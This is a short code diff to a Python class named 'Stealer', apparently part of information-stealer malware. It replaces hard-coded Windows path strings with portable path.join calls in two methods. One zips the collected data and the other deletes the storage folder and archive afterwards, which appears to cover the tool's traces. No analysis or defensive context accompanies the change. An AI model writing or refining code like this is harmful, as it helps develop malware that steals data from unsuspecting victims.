@@ -173,7 +173,7 @@ class Stealer(Thread):
         Creates a data archive.
         :return: None
         """
-        make_archive(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}", "zip", self.__config.StoragePath)
+        make_archive(path.join(path.dirname(self.__config.StoragePath), self.__config.ZipName), "zip", self.__config.StoragePath)
 
     def __delete_files(self) -> None:
         """
@@ -181,7 +181,7 @@ class Stealer(Thread):
         :return: None
         """
         rmtree(self.__config.StoragePath)
-        remove(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}.zip")
+        remove(path.join(path.dirname(self.__config.StoragePath), rf"{self.__config.ZipName}.zip"))
 
     def run(self) -> None:
         """
